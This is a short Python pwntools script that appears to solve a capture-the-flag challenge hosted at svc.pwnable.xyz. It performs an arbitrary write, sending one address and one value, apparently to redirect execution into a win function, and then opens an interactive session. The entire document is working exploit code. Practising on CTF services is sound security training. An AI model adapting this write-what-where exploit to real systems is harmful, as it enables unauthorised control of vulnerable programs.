#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./challenge')
#p = process()
p = remote('svc.pwnable.xyz', 30033)
input()
p.sendafter(b'Addr: ',str(int(0x0000000000600bc0)))
p.sendafter(b'Value: ',str(int(0x0000000000400821)))
p.interactive()
